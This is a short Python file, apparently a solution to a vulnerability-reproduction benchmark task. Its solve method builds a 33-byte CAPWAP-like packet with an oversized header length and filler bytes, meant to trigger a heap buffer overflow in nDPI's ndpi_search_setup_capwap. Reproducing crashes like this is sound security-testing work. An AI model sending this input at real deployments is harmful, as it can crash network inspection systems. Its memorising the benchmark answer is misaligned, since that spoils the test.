import os
import tarfile
import tempfile
import subprocess
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Known PoC for ndpi CAPWAP heap buffer overflow
        # The vulnerability is in ndpi_search_setup_capwap function
        # Ground truth length is 33 bytes
        
        # This PoC creates a minimal CAPWAP-like packet that triggers
        # the heap buffer overflow in the vulnerable version
        poc = bytearray(33)
        
        # Set version and flags for CAPWAP
        poc[0] = 0x0  # Version | H | F | L | W
        
        # Set message type (Discovery Request = 1)
        poc[3] = 0x1
        
        # Set header length to trigger overflow
        # This causes the function to read beyond allocated buffer
        struct.pack_into('>H', poc, 4, 0x8000)  # Large header length
        
        # Fill the rest with data that will cause the overflow
        # when the function processes the packet
        for i in range(8, 33):
            poc[i] = 0x41  # 'A' character
        
        return bytes(poc)